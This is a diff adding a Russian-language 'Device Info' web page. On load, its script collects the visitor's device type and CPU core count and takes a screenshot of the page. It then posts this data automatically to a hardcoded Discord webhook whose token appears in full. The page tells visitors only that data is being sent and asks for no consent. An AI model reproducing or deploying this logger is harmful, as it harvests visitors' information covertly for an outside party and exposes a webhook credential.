@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Info</title>
+    <style>
+        body {
+            margin: 0;
+            background: #1a1a2e;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background: #2e2e4e;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 300px;
+        }
+        h1 {
+            font-size: 24px;
+            margin: 0 0 10px;
+        }
+        p {
+            font-size: 16px;
+            margin: 0 0 10px;
+        }
+        .spinner {
+            border: 4px solid #fff;
+            border-top: 4px solid #6366f1;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .hidden { display: none; }
+        .success { color: #4ade80; }
+        .error { color: #ef4444; }
+    </style>
+</head>
+<body>
+    <div class="container" id="main-content">
+        <h1>Информация</h1>
+        <p>Отправка данных...</p>
+        <div id="loading" class="spinner"></div>
+        <p id="status" class="hidden"></p>
+    </div>
+
+    <script async src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <script>
+        // Функция для получения информации об устройстве
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let device = "Неизвестное устройство";
+            let cpu = "Неизвестный процессор";
+
+            if (ua.includes("iPhone")) device = "iPhone";
+            else if (ua.includes("Android")) device = "Android Device";
+            else if (ua.includes("Windows")) device = "Windows PC";
+
+            if (navigator.hardwareConcurrency) cpu = `${navigator.hardwareConcurrency}-ядерный`;
+
+            return { device, cpu };
+        }
+
+        // Функция для создания скриншота с оптимизацией
+        async function captureScreenshot() {
+            if (!window.html2canvas) return null;
+            try {
+                const canvas = await html2canvas(document.body, {
+                    scale: 0.5, // Уменьшаем масштаб для ускорения и меньшего размера
+                    useCORS: true,
+                    logging: false,
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                });
+                return canvas.toDataURL("image/jpeg", 0.6); // JPEG с качеством 60%
+            } catch (e) {
+                console.error("Скриншот не создан:", e);
+                return null;
+            }
+        }
+
+        // Функция для отправки данных
+        async function sendToDiscordWebhook(info, screenshot) {
+            const webhook = "https://discord.com/api/webhooks/1383151999712890901/VOPy3i32mYdg99r3pGAtVPoGEnOHO1kVlfLM5YNKfMsIUuzb0oSn6W3T8twxj79moIWy"; // Замените на ваш Discord Webhook URL
+            const message = {
+                content: `**Устройство:** ${info.device}\n**Процессор:** ${info.cpu}`,
+                embeds: screenshot ? [{ image: { url: "attachment://screen.jpg" } }] : []
+            };
+
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify(message));
+
+            if (screenshot) {
+                const response = await fetch(screenshot);
+                const blob = await response.blob();
+                formData.append("file", blob, "screen.jpg");
+            }
+
+            try {
+                document.getElementById("loading").style.display = "block";
+                const response = await fetch(webhook, {
+                    method: "POST",
+                    body: formData
+                });
+                document.getElementById("loading").style.display = "none";
+                updateStatus(response.ok ? "Успешно отправлено!" : "Ошибка отправки", response.ok ? "success" : "error");
+            } catch (e) {
+                console.error("Ошибка:", e);
+                document.getElementById("loading").style.display = "none";
+                updateStatus("Ошибка отправки", "error");
+            }
+        }
+
+        // Обновление статуса
+        function updateStatus(text, className) {
+            const status = document.getElementById("status");
+            status.textContent = text;
+            status.className = className;
+        }
+
+        // Выполнение
+        window.onload = async () => {
+            const info = getDeviceInfo();
+            const screenshot = await captureScreenshot();
+            sendToDiscordWebhook(info, screenshot);
+        };
+    </script>
+</body>
+</html>
